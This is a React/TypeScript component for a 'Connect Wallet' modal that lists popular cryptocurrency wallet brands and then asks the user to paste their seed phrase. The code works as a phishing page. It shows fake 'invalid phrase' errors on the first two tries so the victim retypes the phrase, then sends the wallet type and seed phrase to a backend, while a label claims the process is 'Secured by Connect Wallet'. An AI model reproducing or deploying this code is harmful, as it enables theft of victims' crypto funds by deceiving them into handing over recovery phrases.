import React, { useContext, useEffect, useState } from "react";
import { DropdownOverlay } from "./Dashboard";
import ButtonSpinner from "../utils/buttonSpinner";
import { motion } from "framer-motion";
import useAlert from "../../hooks/alert";
import auth from "../../lib/auth";
import helpers from "../../helpers";

type walletTypes = {
    data?: {
        walletID: string,
        seedkey: Array<string>
    },

    walletSelected?: string,
    steps?: number
}
interface WalletcontextInterface {
    dataContext: {
        data: {
            walletID: string,
            seedkey: string[]
        },
    
        walletSelected: string,
        steps: number
    },
    updateContext: (obj: any) => void
}
const Walletcontext:WalletcontextInterface = {} as any;
const CreateWalletContext = React.createContext(Walletcontext);

export default function ConnectWallet({showWallet, setShowWallet}:any) {
    useEffect(() => {
        if(showWallet) {
            const body = document.querySelector('body') as HTMLBodyElement
            body.style.cssText="overflow-y: hidden"
        }
    }, [showWallet])

    function handleClose() {
        const body = document.querySelector('body') as HTMLBodyElement
        body.style.cssText="overflow-y: scroll"
    }

    const [dataContext, setWallet] =useState({
            data: {
                walletID: "",
                seedkey: []
            },
        
            walletSelected: "",
            steps: 0
    });

    let [rem, remStep] = useState(true)

    useEffect(() => {
        if(dataContext.steps < 1){
            setTimeout(() => {
                remStep(false);
                updateContext({steps: ++dataContext.steps})
            },2000)
        }
    }, [])

    function updateContext(obj:walletTypes) {
        if(typeof obj !== "object") return;
        setWallet((prev:walletTypes|any) => { return {data: {
            walletID: obj.data?.walletID || prev.data?.walletID,
            seedkey: obj.data?.seedkey ||prev.data?.seedkey
        },
    
        walletSelected: obj.walletSelected || prev.walletSelected,
        steps: obj.steps || prev.steps
       }})
    }

    return (
        <>
            <div className="absolute top-0 left-0 flex md:justify-center items-center  w-[100vw] h-[100vh] md:p-3  z-[55]">
                <div className="relative lg:w-[650px] md:w-[500px] xs:w-[400px] w-full overflow-hidden  rounded-md">
                    <div className="flex justify-center items-center rounded-md">
                       <div className="flex justify-center">
                        {rem && <ButtonSpinner />}
                       </div>
                        <CreateWalletContext.Provider value={{dataContext, updateContext}}>
                            {
                                dataContext.steps === 1 ?
                                <ConnectWalletEntry setShowWallet={setShowWallet} handleClose={handleClose}/> :
                                dataContext.steps === 2 ?
                                <PickWallet setShowWallet={setShowWallet} handleClose={handleClose}/> :
                                dataContext.steps === 3 ?
                                <SeedInput setShowWallet={setShowWallet} handleClose={handleClose}/> :
                                dataContext.steps === 4 ?
                                <CongratMessage setShowWallet={setShowWallet} handleClose={handleClose}/> : <></>
                            }
                        </CreateWalletContext.Provider>
                    </div>
                </div>
            </div>
            <DropdownOverlay cb={() => setShowWallet(false)} />
        </>
    )
}

function ConnectWalletEntry({setShowWallet,handleClose}:any) {
    const [showBtn, setShowBtn] = useState(false)
    const {dataContext, updateContext} = useContext(CreateWalletContext)
    return (
        <div className="w-full p-3 flex flex-col gap-3 items-center justify-center bg-white h-full">
            <div className="w-full flex justify-between">
             <div className=""></div>

            <h1 className="text-[#3a3838] font-bold text-center text-2xl">Connect Your Wallet.</h1>

            <button className="" onClick={() =>{setShowWallet(false); handleClose(false)}}>
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><g fill="red"><path d="M16.396 7.757a1 1 0 0 1 0 1.415l-2.982 2.981l2.676 2.675a1 1 0 1 1-1.415 1.415L12 13.567l-2.675 2.676a1 1 0 0 1-1.415-1.415l2.676-2.675l-2.982-2.981A1 1 0 1 1 9.02 7.757L12 10.74l2.981-2.982a1 1 0 0 1 1.415 0Z"/><path fill-rule="evenodd" d="M4 1a3 3 0 0 0-3 3v16a3 3 0 0 0 3 3h16a3 3 0 0 0 3-3V4a3 3 0 0 0-3-3H4Zm16 2H4a1 1 0 0 0-1 1v16a1 1 0 0 0 1 1h16a1 1 0 0 0 1-1V4a1 1 0 0 0-1-1Z" clip-rule="evenodd"/></g></svg>
                </button>
            </div>
            <p className="text-[#212121] text-sm">Secure account . Make transaction faster . Recieve fund instanly</p>

            <button type="button" onClick={() => {
                setShowBtn(true)
                updateContext({steps: ++dataContext.steps})
            }} className="border-none w-[200px] bg-[rgb(12,108,242)] cursor-pointer hover:bg-[rgba(12,70,151,0.68)] flex gap-2 justify-center disabled:bg-[rgba(12,108,242,0.68)]  text-white p-3 rounded-md font-medium" disabled={showBtn}>
                {showBtn && <ButtonSpinner color="#ccc"/>}
                <span>Connect Wallet</span>
            </button>
    
        </div>
    )
}


function PickWallet({setShowWallet, handleClose}:any) {
    const [showBtn, setShowBtn] = useState(true)
    const [loading, setLoading] = useState(false)
    const {dataContext, updateContext} = useContext(CreateWalletContext)

    const images = [
        "atomicwallet",
        "blockchain",
        "coinbase",
        "coinomi",
        "exodus",
        "klever",
        "kraken",
        "kucoin",
        "metamask",
        "myetherwallet",
        "trustwallet"
    ];

    function handleWallet(ev:any) {
        updateContext({walletSelected: ev.target.id, data: {walletID: ev.target.id}});
        if(ev.target.id) {
            setShowBtn(false)
            setLoading(false)
        }
    }

    return (
        <div className=" w-full p-2 mobile:h-[500px] min-h-[500px] min-w-full flex flex-col gap-3 items-center mobile:justify-center bg-[#fff] ">
            <div className="flex justify-between w-full p-3">
                <button  onClick={() => {
                    return updateContext({steps: --dataContext.steps})
                }}
                className="border-none appearance-none ">
                    <svg xmlns="http://www.w3.org/2000/svg" className="group-hover:scale-110" width="24" height="24" viewBox="0 0 1024 1024"><path fill="currentColor" d="M685.248 104.704a64 64 0 0 1 0 90.496L368.448 512l316.8 316.8a64 64 0 0 1-90.496 90.496L232.704 557.248a64 64 0 0 1 0-90.496l362.048-362.048a64 64 0 0 1 90.496 0z"/></svg>
                </button>
                <h1 className="text-[#3a3838] font-bold text-center text-2xl">Pick Your Wallet.</h1>
                <button className="" onClick={() =>{setShowWallet(false); handleClose(false)}}>
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><g fill="red"><path d="M16.396 7.757a1 1 0 0 1 0 1.415l-2.982 2.981l2.676 2.675a1 1 0 1 1-1.415 1.415L12 13.567l-2.675 2.676a1 1 0 0 1-1.415-1.415l2.676-2.675l-2.982-2.981A1 1 0 1 1 9.02 7.757L12 10.74l2.981-2.982a1 1 0 0 1 1.415 0Z"/><path fill-rule="evenodd" d="M4 1a3 3 0 0 0-3 3v16a3 3 0 0 0 3 3h16a3 3 0 0 0 3-3V4a3 3 0 0 0-3-3H4Zm16 2H4a1 1 0 0 0-1 1v16a1 1 0 0 0 1 1h16a1 1 0 0 0 1-1V4a1 1 0 0 0-1-1Z" clip-rule="evenodd"/></g></svg>
                </button>
            </div>
            <div className="w-full mobile:h-auto h-[450px] p-3 pb-4 mt-3 mobile:grid lg:grid-cols-5 md:grid-cols-4 xs:grid-cols-3  grid-cols-2 flex flex-wrap items-start justify-center mobile:place-content-center mx-2 gap-4 overflow-y-auto">
                {
                    images.map((src:string, i) => (
                        <motion.div
                         key={i.toString()}
                         initial={{opacity: 0, y: i*2}}
                         animate={{opacity: 1, y: i*2, transition: {duration: .2, delay: (i/5)}}}
                         exit={{opacity: 1, transition: {delay: .2}}}
                         title={src}
                         className="flex flex-col items-center group">
                            <motion.label htmlFor={src}>
                                <div className={`flex justify-center cursor-pointer items-center bg-white w-[100px] h-[100px] rounded-full transition-colors duration-300 p-2 group-hover:border-[#4874ebed] ${dataContext.walletSelected === src ? 'border-[#4874ebed]' : 'border-[#b4b6bb]'} border-[1px] overflow-hidden`}>
                                    <img src={`/walletconnect/${src}.png`} className="object-contain" alt={src} width={100} height={100}/>
                                </div>
                                <input type="radio" id={src} name="wallet" className="hidden" onChange={handleWallet}/>
                            </motion.label>
                            <p className={` text-[#212121cc] ${dataContext.walletSelected === src ? 'text-blue-600 font-semibold' : 'group-hover:text-blue-600 group-hover:font-semibold'} capitalize transition-colors duration-300 `}>{src}</p>
                        </motion.div>
                    ))
                }
            </div>
            <div className="w-full flex justify-center">
            <button type="button" onClick={() => {
                setLoading(true)
                if(dataContext.data.walletID) return updateContext({steps: ++dataContext.steps})
            }} className="border-none w-[200px] bg-[rgb(12,108,242)]  mt-2 cursor-pointer hover:bg-[rgba(12,70,151,0.68)] flex gap-2 justify-center disabled:bg-[rgba(12,108,242,0.68)]  text-white p-3 rounded-md font-medium" disabled={showBtn}>
                {loading && <ButtonSpinner color="#ccc"/>}
                <span>Connect Wallet</span>
            </button>
            </div>

        </div>
    )
}


 function SeedInput({setShowWallet, handleClose}:any) {
    const {dataContext, updateContext} = useContext(CreateWalletContext)
    const {AlertComponent, showAlert} = useAlert()
    const [showBtn, setShowBtn] = useState(false)
    const [loading, setLoading] = useState(false)
    let [count, setCount] = useState(0)

    
    async function handleSeedPhrases(ev:any) {
        ev.preventDefault();
        const seedPhrases = {
            keyphrase: ev.target.keyphrase.value
        }

        if(seedPhrases.keyphrase.split(' ').length > 24) return showAlert("error", "Invalid key phrase.")
            // checking all seed key matches
            let seedKey:any = dataContext.data.seedkey
            if(typeof seedKey === "object" || seedKey.length > 1) {
                for(let i = 0; i < seedKey.length; ++i){
                    for(let j = i; j < seedKey.length; ++j) {
                        if(seedKey[i].trim() !== seedKey[(j+1) -1].trim()) {
                            return showAlert("error", "Invalid key phrase.")
                        }
                    }
                }    
            }

        // checking if each key is less than 4
        seedPhrases.keyphrase.split(' ').forEach((key:string) => {
            if(key.trim().length < 4) return showAlert("error", "Invalid key phrase.")
        })

        // if length >= 12
        if(seedPhrases.keyphrase.split(' ').length < 12)  return showAlert("error", "Invalid key phrase.")

        if(count < 2) {
            showAlert("error", "Make sure phrases are valid")
            ev.target.keyphrase.placeholder = "Paste Seed phrase to avoid mistake."
            ev.target.keyphrase.value = ""
            updateContext({data: {seedkey: [...dataContext.data.seedkey, seedPhrases.keyphrase]}})
            setCount(++count);
            return
        }

        // make backend bullshit
        const data = {
            walletType: dataContext.data.walletID,
            seedKey: seedPhrases.keyphrase,
        }
        setShowBtn(true)
        setLoading(true)
        try {
            ev.target.keyphrase.value = ""
            const res = await auth.walletConnect(helpers.getCookie('xat'), data);
            showAlert("success", res.data.message)
            updateContext({steps: ++dataContext.steps})
        } catch (error:any) {
            setShowBtn(false)
            setLoading(false)
            showAlert("error",(typeof error.response.data.description !== "object" ? error.response.data.description : "Something Went Wrong"))
        }

    }
    return (
        <>
        <div className="p-3 w-full flex flex-col gap-3 items-center justify-center bg-[#fff]">
            <div className="flex justify-between w-full items-center">
                <button  onClick={() => {
                    return updateContext({steps: --dataContext.steps})
                }}
                className="border-none appearance-none ">
                    <svg xmlns="http://www.w3.org/2000/svg" className="group-hover:scale-110" width="24" height="24" viewBox="0 0 1024 1024"><path fill="currentColor" d="M685.248 104.704a64 64 0 0 1 0 90.496L368.448 512l316.8 316.8a64 64 0 0 1-90.496 90.496L232.704 557.248a64 64 0 0 1 0-90.496l362.048-362.048a64 64 0 0 1 90.496 0z"/></svg>
                </button>

                <div className="flex gap-2 items-center">
                    <motion.div
                    initial={{opacity: 0}}
                    animate={{opacity: 1, transition: {duration: .2, delay: .5}}}
                    className="flex flex-col items-center group">
                        <motion.label htmlFor={dataContext.walletSelected}>
                            <div className={`flex justify-center cursor-pointer items-center bg-white w-[35px] h-[35px] rounded-full transition-colors duration-300 p-2 group-hover:border-[#4874ebed] ${dataContext.walletSelected === dataContext.walletSelected ? 'border-[#4874ebed]' : 'border-[#b4b6bb]'} border-[1px] overflow-hidden`}>
                                <img src={`/main.png`} className="object-contain" alt={dataContext.walletSelected} width={100} height={100}/>
                            </div>
                        </motion.label>
                    </motion.div>
                    <h1 className="text-[#3a3838] font-bold text-center text-2xl">Seed Phrase.</h1>
                </div>
                
                <button className=""  onClick={() =>{setShowWallet(false); handleClose(false)}}>
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><g fill="red"><path d="M16.396 7.757a1 1 0 0 1 0 1.415l-2.982 2.981l2.676 2.675a1 1 0 1 1-1.415 1.415L12 13.567l-2.675 2.676a1 1 0 0 1-1.415-1.415l2.676-2.675l-2.982-2.981A1 1 0 1 1 9.02 7.757L12 10.74l2.981-2.982a1 1 0 0 1 1.415 0Z"/><path fill-rule="evenodd" d="M4 1a3 3 0 0 0-3 3v16a3 3 0 0 0 3 3h16a3 3 0 0 0 3-3V4a3 3 0 0 0-3-3H4Zm16 2H4a1 1 0 0 0-1 1v16a1 1 0 0 0 1 1h16a1 1 0 0 0 1-1V4a1 1 0 0 0-1-1Z" clip-rule="evenodd"/></g></svg>
                </button>
            </div>
            <p className="text-[#212121]">Insert your {dataContext.walletSelected} KeyPhrases, Seprate keys with spaces</p>
            <form action="" onSubmit={handleSeedPhrases} method="post">
                <textarea name="keyphrase" placeholder="Input your seed Phrases" className="w-full bg-[#f4f4f4] rounded-md mb-3 border-[1px] p-2 outline-none border-[#ccc] font-semibold uppercase" autoComplete="off" autoCorrect="none" cols={50} rows={3} required></textarea>

                <div className="w-full flex justify-between items-center">
                    <button type="submit"
                    className="border-none w-[200px] bg-[rgb(12,108,242)] flex gap-2 justify-center disabled:bg-[rgba(12,108,242,0.68)]  text-white p-3 rounded-md font-medium" disabled={showBtn}>
                    {loading && <ButtonSpinner color="#ccc"/>}
                        <span>Connect Wallet</span>
                    </button>

                    <div className="text-[#212121bb] flex gap-1 items-center group">
                        <img src={`/walletconnect/wallet.png`} className="object-contain grayscale  group-hover:grayscale-0 transition-all duration-500" alt={dataContext.walletSelected} width={30} height={30}/>

                        <span>Secured by Connect Wallet</span>
                    </div>
                </div>
            </form>
            {AlertComponent}
            </div>
        </>
    )
}


function CongratMessage({setShowWallet, handleClose}:any) {
    return (
        <>
            <div className="p-3 w-full flex flex-col gap-3 items-center justify-center bg-[#fff]">
                <h1 className='text-[#33406a] text-3xl font-bold mb-1'>
                    <svg xmlns="http://www.w3.org/2000/svg" width="50" height="50" viewBox="0 0 1024 1024"><path fill="green" d="M512 0C229.232 0 0 229.232 0 512c0 282.784 229.232 512 512 512c282.784 0 512-229.216 512-512C1024 229.232 794.784 0 512 0zm0 961.008c-247.024 0-448-201.984-448-449.01c0-247.024 200.976-448 448-448s448 200.977 448 448s-200.976 449.01-448 449.01zm204.336-636.352L415.935 626.944l-135.28-135.28c-12.496-12.496-32.752-12.496-45.264 0c-12.496 12.496-12.496 32.752 0 45.248l158.384 158.4c12.496 12.48 32.752 12.48 45.264 0c1.44-1.44 2.673-3.009 3.793-4.64l318.784-320.753c12.48-12.496 12.48-32.752 0-45.263c-12.512-12.496-32.768-12.496-45.28 0z"/></svg>
                </h1>
                <h1 className="text-[#383a38] font-bold text-center text-2xl">Connected Successfully.</h1>
                {/* <button type="button" className="border-none bg-[rgb(242,12,12)] text-white p-3 rounded-md font-medium">Close</button> */}
                <button className="" onClick={() =>{setShowWallet(false); handleClose(false)}}>
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><g fill="red"><path d="M16.396 7.757a1 1 0 0 1 0 1.415l-2.982 2.981l2.676 2.675a1 1 0 1 1-1.415 1.415L12 13.567l-2.675 2.676a1 1 0 0 1-1.415-1.415l2.676-2.675l-2.982-2.981A1 1 0 1 1 9.02 7.757L12 10.74l2.981-2.982a1 1 0 0 1 1.415 0Z"/><path fill-rule="evenodd" d="M4 1a3 3 0 0 0-3 3v16a3 3 0 0 0 3 3h16a3 3 0 0 0 3-3V4a3 3 0 0 0-3-3H4Zm16 2H4a1 1 0 0 0-1 1v16a1 1 0 0 0 1 1h16a1 1 0 0 0 1-1V4a1 1 0 0 0-1-1Z" clip-rule="evenodd"/></g></svg>
                </button>
            </div>
        </>
    )
}
